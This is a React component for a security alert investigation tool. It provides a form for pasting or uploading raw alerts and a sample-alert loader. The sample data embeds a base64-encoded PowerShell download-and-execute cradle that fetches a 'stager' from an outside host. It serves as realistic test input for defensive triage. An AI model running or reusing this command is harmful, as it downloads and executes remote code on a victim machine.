import React, { useState, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import {
  Upload, FileText, AlertTriangle, Zap, Monitor, Shield, Mail,
  Wifi, Lock, Bug, ChevronDown, X, Loader2, Send,
} from 'lucide-react';
import { investigationAPI } from '../utils/api';
import { ALERT_TYPES } from '../utils/constants';

const iconMap = {
  Monitor, Shield, Mail, Wifi, Lock, AlertTriangle, Bug, FileText,
};

export default function AlertSubmit() {
  const navigate = useNavigate();
  const fileInputRef = useRef(null);

  const [alertText, setAlertText] = useState('');
  const [alertType, setAlertType] = useState('siem');
  const [selectedFile, setSelectedFile] = useState(null);
  const [isDragOver, setIsDragOver] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState(null);
  const [showTypeDropdown, setShowTypeDropdown] = useState(false);

  const selectedTypeConfig = ALERT_TYPES.find((t) => t.value === alertType);
  const SelectedIcon = selectedTypeConfig ? iconMap[selectedTypeConfig.icon] || FileText : FileText;

  // Drag and drop handlers
  const handleDragOver = useCallback((e) => {
    e.preventDefault();
    setIsDragOver(true);
  }, []);

  const handleDragLeave = useCallback((e) => {
    e.preventDefault();
    setIsDragOver(false);
  }, []);

  const handleDrop = useCallback((e) => {
    e.preventDefault();
    setIsDragOver(false);
    const files = e.dataTransfer.files;
    if (files.length > 0) {
      setSelectedFile(files[0]);
      // Read file contents into textarea
      const reader = new FileReader();
      reader.onload = (event) => {
        setAlertText(event.target.result);
      };
      reader.readAsText(files[0]);
    }
  }, []);

  const handleFileSelect = useCallback((e) => {
    const file = e.target.files?.[0];
    if (file) {
      setSelectedFile(file);
      const reader = new FileReader();
      reader.onload = (event) => {
        setAlertText(event.target.result);
      };
      reader.readAsText(file);
    }
  }, []);

  const removeFile = useCallback(() => {
    setSelectedFile(null);
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  }, []);

  const handleSubmit = async () => {
    if (!alertText.trim() && !selectedFile) {
      setError('Please provide alert data or upload a file');
      return;
    }

    setIsSubmitting(true);
    setError(null);

    try {
      let response;

      if (selectedFile && !alertText.trim()) {
        // File upload mode
        const formData = new FormData();
        formData.append('file', selectedFile);
        formData.append('alert_type', alertType);
        response = await investigationAPI.submitFile(formData);
      } else {
        // Text submit mode
        response = await investigationAPI.submit({
          raw_alert: alertText,
          alert_type: alertType,
        });
      }

      const investigationId = response.data?.id || response.data?.investigation_id;
      if (investigationId) {
        navigate(`/investigate/${investigationId}`);
      } else {
        // Fallback: go to history
        navigate('/history');
      }
    } catch (err) {
      console.error('[Submit] Error:', err);
      setError(err?.message || 'Failed to submit investigation');
      setIsSubmitting(false);
    }
  };

  // Sample alert data for quick testing
  const loadSample = () => {
    setAlertText(`{
  "timestamp": "${new Date().toISOString()}",
  "rule_name": "Suspicious PowerShell Execution",
  "severity": "HIGH",
  "source_ip": "10.0.15.42",
  "destination_ip": "185.220.101.34",
  "hostname": "WORKSTATION-PC07",
  "username": "jsmith",
  "process": "powershell.exe",
  "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQAyAGIAZQBlAC4AbgBlAHQALwBzAHQAYQBnAGUAcgAnACkA",
  "parent_process": "cmd.exe",
  "file_hash": "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
  "alert_id": "EDR-2024-${Math.floor(Math.random() * 9999)}",
  "url": "http://e2bee.net/stager",
  "dns_query": "evil-domain.xyz"
}`);
    setAlertType('edr');
  };

  return (
    <div className="max-w-4xl mx-auto space-y-6 pb-8">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-gray-100 flex items-center gap-3">
          <Zap size={24} className="text-neon-green" />
          New Investigation
        </h1>
        <p className="text-sm text-gray-500 mt-1 font-mono">
          Submit raw alert data for autonomous AI analysis
        </p>
      </div>

      {/* Alert Type Selector */}
      <div className="cyber-card p-5">
        <label className="block text-xs font-mono text-gray-400 uppercase tracking-wider mb-3">
          Alert Source Type
        </label>
        <div className="relative">
          <button
            onClick={() => setShowTypeDropdown(!showTypeDropdown)}
            className="w-full cyber-input flex items-center justify-between cursor-pointer"
          >
            <div className="flex items-center gap-3">
              <SelectedIcon size={16} className="text-neon-blue" />
              <span>{selectedTypeConfig?.label || 'Select type'}</span>
            </div>
            <ChevronDown
              size={16}
              className={`text-gray-500 transition-transform ${
                showTypeDropdown ? 'rotate-180' : ''
              }`}
            />
          </button>

          {showTypeDropdown && (
            <div className="absolute z-50 w-full mt-2 cyber-card border border-cyber-border rounded-lg shadow-lg overflow-hidden">
              {ALERT_TYPES.map((type) => {
                const TypeIcon = iconMap[type.icon] || FileText;
                return (
                  <button
                    key={type.value}
                    onClick={() => {
                      setAlertType(type.value);
                      setShowTypeDropdown(false);
                    }}
                    className={`w-full flex items-center gap-3 px-4 py-3 text-sm font-mono
                      transition-colors hover:bg-cyber-hover text-left
                      ${
                        alertType === type.value
                          ? 'text-neon-green bg-neon-green/5'
                          : 'text-gray-300'
                      }`}
                  >
                    <TypeIcon size={16} className={alertType === type.value ? 'text-neon-green' : 'text-gray-500'} />
                    {type.label}
                  </button>
                );
              })}
            </div>
          )}
        </div>
      </div>

      {/* Alert Data Input */}
      <div className="cyber-card p-5">
        <div className="flex items-center justify-between mb-3">
          <label className="text-xs font-mono text-gray-400 uppercase tracking-wider">
            Raw Alert Data
          </label>
          <button
            onClick={loadSample}
            className="text-xs font-mono text-neon-blue hover:text-neon-green transition-colors"
          >
            Load Sample Alert
          </button>
        </div>

        <div
          className={`relative transition-all duration-300 ${
            isDragOver ? 'scale-[1.01]' : ''
          }`}
          onDragOver={handleDragOver}
          onDragLeave={handleDragLeave}
          onDrop={handleDrop}
        >
          <textarea
            value={alertText}
            onChange={(e) => setAlertText(e.target.value)}
            placeholder={`Paste your raw alert data here...

Supported formats:
  - JSON alert payload
  - Syslog entries
  - CSV data
  - Raw log lines
  - Email headers (for phishing)

Or drag & drop a file onto this area.`}
            rows={16}
            className={`w-full cyber-input resize-none text-xs leading-relaxed
              ${isDragOver ? 'border-neon-green bg-neon-green/5' : ''}
            `}
            style={{
              boxShadow: alertText
                ? '0 0 15px rgba(0, 255, 136, 0.05), inset 0 0 30px rgba(0, 255, 136, 0.02)'
                : 'none',
            }}
            spellCheck={false}
          />

          {/* Drag overlay */}
          {isDragOver && (
            <div className="absolute inset-0 flex items-center justify-center bg-cyber-bg/80 border-2 border-dashed border-neon-green rounded-md">
              <div className="text-center">
                <Upload size={32} className="text-neon-green mx-auto mb-2" />
                <p className="text-neon-green font-mono text-sm">
                  Drop file here
                </p>
              </div>
            </div>
          )}
        </div>

        {/* Character count */}
        <div className="flex items-center justify-between mt-2">
          <span className="text-[10px] font-mono text-gray-600">
            {alertText.length.toLocaleString()} characters
          </span>
          {alertText.length > 0 && (
            <button
              onClick={() => setAlertText('')}
              className="text-[10px] font-mono text-gray-500 hover:text-neon-red transition-colors"
            >
              Clear
            </button>
          )}
        </div>
      </div>

      {/* File Upload */}
      <div className="cyber-card p-5">
        <label className="block text-xs font-mono text-gray-400 uppercase tracking-wider mb-3">
          File Upload (Optional)
        </label>

        {selectedFile ? (
          <div className="flex items-center gap-3 p-3 bg-cyber-bg rounded-lg border border-cyber-border">
            <FileText size={18} className="text-neon-blue flex-shrink-0" />
            <div className="flex-1 min-w-0">
              <p className="text-sm font-mono text-gray-200 truncate">
                {selectedFile.name}
              </p>
              <p className="text-xs font-mono text-gray-500">
                {(selectedFile.size / 1024).toFixed(1)} KB
              </p>
            </div>
            <button
              onClick={removeFile}
              className="p-1 hover:bg-neon-red/10 rounded transition-colors"
            >
              <X size={14} className="text-gray-500 hover:text-neon-red" />
            </button>
          </div>
        ) : (
          <button
            onClick={() => fileInputRef.current?.click()}
            className="w-full p-6 border-2 border-dashed border-cyber-border rounded-lg
                       hover:border-neon-green/30 hover:bg-neon-green/5
                       transition-all duration-200 group"
          >
            <div className="text-center">
              <Upload
                size={28}
                className="text-gray-600 mx-auto mb-2 group-hover:text-neon-green transition-colors"
              />
              <p className="text-sm font-mono text-gray-400 group-hover:text-gray-300">
                Click to upload or drag & drop
              </p>
              <p className="text-xs font-mono text-gray-600 mt-1">
                .json, .log, .txt, .csv, .eml
              </p>
            </div>
          </button>
        )}

        <input
          ref={fileInputRef}
          type="file"
          accept=".json,.log,.txt,.csv,.eml,.xml,.syslog"
          onChange={handleFileSelect}
          className="hidden"
        />
      </div>

      {/* Error Display */}
      {error && (
        <div className="flex items-center gap-3 p-4 bg-neon-red/10 border border-neon-red/30 rounded-lg">
          <AlertTriangle size={18} className="text-neon-red flex-shrink-0" />
          <p className="text-sm font-mono text-neon-red">{error}</p>
        </div>
      )}

      {/* Submit Button */}
      <button
        onClick={handleSubmit}
        disabled={isSubmitting || (!alertText.trim() && !selectedFile)}
        className={`
          w-full py-4 rounded-lg font-mono font-bold text-sm uppercase tracking-widest
          transition-all duration-300 relative overflow-hidden
          flex items-center justify-center gap-3
          ${
            isSubmitting
              ? 'bg-neon-green/20 text-neon-green border border-neon-green cursor-wait'
              : !alertText.trim() && !selectedFile
              ? 'bg-gray-800/50 text-gray-600 border border-gray-700 cursor-not-allowed'
              : 'bg-neon-green/10 text-neon-green border border-neon-green/50 hover:bg-neon-green/20 hover:border-neon-green hover:shadow-neon-green cursor-pointer'
          }
        `}
      >
        {isSubmitting ? (
          <>
            <Loader2 size={18} className="animate-spin" />
            <span>Initializing Investigation...</span>
            {/* Scan line effect */}
            <div className="absolute inset-0 overflow-hidden">
              <div className="absolute inset-x-0 h-0.5 bg-neon-green/30 animate-scan" />
            </div>
          </>
        ) : (
          <>
            <Send size={18} />
            <span>Launch Investigation</span>
          </>
        )}
      </button>

      {/* Info box */}
      <div className="cyber-card p-4 border-neon-blue/20">
        <div className="flex gap-3">
          <div className="p-2 bg-neon-blue/10 rounded-lg h-fit">
            <Shield size={16} className="text-neon-blue" />
          </div>
          <div>
            <h4 className="text-sm font-semibold text-gray-300 mb-1">
              Autonomous Investigation Pipeline
            </h4>
            <p className="text-xs text-gray-500 leading-relaxed">
              Your alert will be processed through our AI-powered pipeline: parsing and IOC extraction,
              multi-source threat intelligence enrichment (VirusTotal, AbuseIPDB, Shodan, etc.),
              MITRE ATT&CK mapping, and deep AI analysis to deliver a verdict with confidence score.
              Average processing time: 15-45 seconds.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
